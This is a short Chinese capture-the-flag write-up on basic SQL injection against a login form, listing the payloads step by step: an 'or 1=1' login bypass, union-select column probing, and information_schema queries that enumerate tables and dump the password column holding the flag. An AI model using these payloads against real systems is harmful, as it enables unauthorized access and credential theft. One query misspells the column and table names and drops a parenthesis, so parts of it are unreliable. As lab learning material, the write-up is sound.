# sql注入基础

首先在password中构造万能语句：
```
admin'or 1=1#
```
可以看到admin的密码，要多尝试字符，看是什么闭合，这里是单引号闭合

然后使用
```
admin' union select 1,2,3#
```
找到返回数据显示的位置

然后构造联合注入语句

首先使用
```
admin' union select 1,(select database()),3#
```
找出当前使用数据库的名字


然后使用
```
admin' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#
```
查看数据表，看到有两张表，分别为geekuser和IOve1ysq1

然后查看两张表的字段的信息，发现flag在IOve1ysq1的password中
```
admin' union select 1,(select group_concat(columns_name) from information_schema.columns where table_schema=database() and table_name='IOve1sq1'#
```
```
admin' union select 1,2,group_concat(password) from IOve1ysq1#
```

可以看见flag


